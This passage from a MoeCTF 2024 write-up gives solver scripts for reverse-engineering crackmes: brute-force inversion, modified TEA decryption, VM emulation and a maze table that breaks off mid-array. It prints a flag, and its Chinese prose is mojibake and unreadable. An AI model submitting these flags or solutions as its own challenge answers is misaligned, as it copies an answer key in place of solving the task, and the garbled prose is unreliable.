class="hljs-number">0x11297e95</span> , <span class="hljs-number">0x5cf2821b</span> , <span class="hljs-number">0x747970da</span> , <span class="hljs-number">0x64793c81</span>&#125;;<br>    <span class="hljs-type">int</span> c[<span class="hljs-number">11</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span> (m=<span class="hljs-number">0x20202020</span>;m&lt;=<span class="hljs-number">0x7d7d7d7d</span>;m++)&#123;<br>            <span class="hljs-type">int</span> b=(m* <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>;<br><br>            <span class="hljs-keyword">if</span>(b==a[i])&#123;<br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,(m* 0xccffbbbb + 0xdeadc0de) ^ 0xdeadbeef + 0xd3906);</span><br>                <span class="hljs-comment">//printf(&quot;%x,&quot;,m);</span><br>                c[i]=m;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>;j++)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(c[i]&gt;&gt;(<span class="hljs-number">8</span>*j))&amp;<span class="hljs-number">0xff</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//moectf&#123;c5f44c32-cbb9-444e-aef4-c0fa7c7a6b7a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="moedaily"><a href="#moedaily" class="headerlink" title="moedaily"></a>moedaily</h2><p>è¿™é¢˜æ¯”è¾ƒåˆ›æ–°ï¼Œç”¨excelå®ç°äº†teaï¼Œæ³¨æ„64æ¬¡å¾ªç¯ï¼Œä¸”32æ¬¡ä¹‹åsumè¦é‡ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">114514</span>, sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    sum = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">415144</span>)^(((v0&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">19883</span>)^(v0+sum));<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+<span class="hljs-number">114514</span>)^(((v1&gt;&gt;<span class="hljs-number">5</span>)+<span class="hljs-number">1919810</span>)^(v1+sum));<br>        sum-=<span class="hljs-number">114514</span>; <br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>,<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">1397140385</span>,<span class="hljs-number">2386659843</span>,<span class="hljs-number">962571399</span>,<span class="hljs-number">3942687964</span>,<span class="hljs-number">3691974192</span>,<span class="hljs-number">863943258</span>,<span class="hljs-number">216887638</span>,<span class="hljs-number">3212824238</span>,<span class="hljs-number">3802077983</span>,<span class="hljs-number">1839161422</span>,<span class="hljs-number">1288683919</span>,<span class="hljs-number">3222915626</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//sum=0</span><br><span class="hljs-comment">//IF(LEN(D11)=48,IF(AND(AND(AND(AND(AND(AND(H14=1397140385,I14=2386659843),AND(H15=962571399,I15=3942687964)),AND(H16=3691974192,I16=863943258)),AND(H17=216887638,I17=3212824238)),AND(H18=3802077983,I18=1839161422)),AND(H19=1288683919,I19=3222915626)),&quot;æ­å–œä½ ï¼Œæ‹¿åˆ°äº†çœŸçš„FLAG&quot;,&quot;FLAGè¾“å…¥é”™äº†ï¼Œå†è¯•è¯•&quot;),&quot;flagé•¿åº¦ä¸å¯¹&quot;)</span><br><span class="hljs-comment">//sum+=114514</span><br><span class="hljs-comment">//v0+=((v1&lt;&lt;4+114514)^((v1&gt;&gt;5+1919810)^(v1+sum)))&amp;0xffffffff</span><br><span class="hljs-comment">//v1+=((v0&lt;&lt;4+415144)^((v0&gt;&gt;5+19883)^(v0+sum)))&amp;0xffffffff</span><br></code></pre></td></tr></table></figure><h2 id="moejvav"><a href="#moejvav" class="headerlink" title="moejvav"></a>moejvav</h2><p>ç»™çš„å‘½ä»¤æ˜¯è¿è¡Œç”¨çš„</p><p>vmé¢˜ï¼Œä½†æ˜¯å¯ä»¥è‡ªå·±æ¨¡æ‹Ÿä¸€ä¸‹</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724136823247-4cdf7e68-d4fa-4e52-bb58-18b8af598597.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#(input^202)+32</span><br><span class="hljs-comment">#^60-20</span><br>a=[-<span class="hljs-number">25</span>,-<span class="hljs-number">27</span>,-<span class="hljs-number">33</span>,-<span class="hljs-number">31</span>,-<span class="hljs-number">50</span>,-<span class="hljs-number">36</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">24</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">29</span>,-<span class="hljs-number">52</span>]<br><span class="hljs-comment">#^14+5</span><br>b=[-<span class="hljs-number">64</span>,-<span class="hljs-number">58</span>,-<span class="hljs-number">63</span>,-<span class="hljs-number">52</span>,-<span class="hljs-number">90</span>,-<span class="hljs-number">39</span>,-<span class="hljs-number">43</span>,<span class="hljs-number">26</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">49</span>,-<span class="hljs-number">64</span>]<br><span class="hljs-comment">#^10+5</span><br>c=[-<span class="hljs-number">51</span>,<span class="hljs-number">25</span>,-<span class="hljs-number">45</span>,-<span class="hljs-number">55</span>,-<span class="hljs-number">47</span>,<span class="hljs-number">24</span>,-<span class="hljs-number">41</span>,-<span class="hljs-number">60</span>,<span class="hljs-number">22</span>,-<span class="hljs-number">40</span>,-<span class="hljs-number">60</span>]<br><span class="hljs-comment">#+24</span><br>d=[-<span class="hljs-number">15</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">51</span>,-<span class="hljs-number">31</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">50</span>,-<span class="hljs-number">35</span>,<span class="hljs-number">51</span>,-<span class="hljs-number">17</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(b))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((a[i]+<span class="hljs-number">20</span>)^<span class="hljs-number">60</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((b[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">14</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((c[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">10</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(((((d[i]-<span class="hljs-number">24</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="sm4"><a href="#sm4" class="headerlink" title="sm4"></a>sm4</h2><p>ç›´æ¥åœ¨çº¿è§£å¯†ä¸å¯¹ï¼Œä¼°è®¡è¿˜éœ€è¦iv</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724158570823-42595b04-7841-416b-b72d-103875251e17.png" class="" title="img"><p>å¯èƒ½ç®—æ³•æœ‰é­”æ”¹ï¼Œæµ‹è¯•è¿‡åŠ å¯†å‡½æ•°å’Œè§£å¯†å‡½æ•°åˆšå¥½å¯¹ç§°ï¼Œé‚£å°±æŠŠè§£å¯†å‡½æ•°çš„encode_Resultæ”¹ä¸ºenc</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png" class="" title="img"><p>è°ƒè¯•å‘ç°è§£å¯†ä¹‹åå’Œç›´æ¥è§£å¯†ç»“æœä¸€æ ·</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144769981-14f1d7ba-a31c-4edb-ac48-8723e5e0bece.png" class="" title="img"><p>è¾“å…¥é•¿åº¦ä¸º48ä½çš„æ—¶å€™æ­£å¸¸è¾“å‡ºflag</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png" class="" title="img"><p>è¿™é¢˜ä¸åŒä¹‹å¤„åœ¨äºç›´æ¥ç»™äº†åŠ è§£å¯†å‡½æ•°ï¼Œä¹Ÿå¯ä»¥åˆ°è§£å¯†å‡½æ•°æŠŠåŠ å¯†åçš„æ•°æ®æ”¹æˆå¯†æ–‡</p><h2 id="ez-MAZE"><a href="#ez-MAZE" class="headerlink" title="ez_MAZE"></a>ez_MAZE</h2><p>ç±»ä¼¼è¿·å®«é¢˜ï¼Œå¤šäº†ä¸€ä¸ªæ ¡éªŒå‡½æ•°ï¼Œä¼šæŠŠåå¤çš„è·³åŠ¨æ’é™¤</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461159260-6c09856e-a8b9-427e-a292-714d8ba0af37.png" class="" title="img"><p>å› ä¸ºé€†å‘é¢˜ç›®çš„è·¯å¾„å¤§å¤šå”¯ä¸€ä¸”ä¸éœ€è¦è€ƒè™‘å›æº¯ï¼Œç›´æ¥çˆ†ç ´å³å¯ï¼Œè¿™é‡Œçˆ†ç ´çš„æ—¶å€™å‘ç°çˆ†ä¸åˆ°æŒ‡å®šé•¿åº¦ä¸”ä¸åŒé¡ºåºå¯¹äºçˆ†ç ´é•¿åº¦æœ‰å½±å“ï¼Œé‚£å°±å›æº¯å‡ æ­¥æ¢ä¸€ä¸ªçˆ†ç ´é¡ºåºï¼Œè¿™é‡Œéœ€è¦å°è¯•</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461125455-3822aed3-e8dd-435c-8d2a-b45ca00f2ce9.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x1F</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAA</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAE</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x95</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x5D</span>, <span 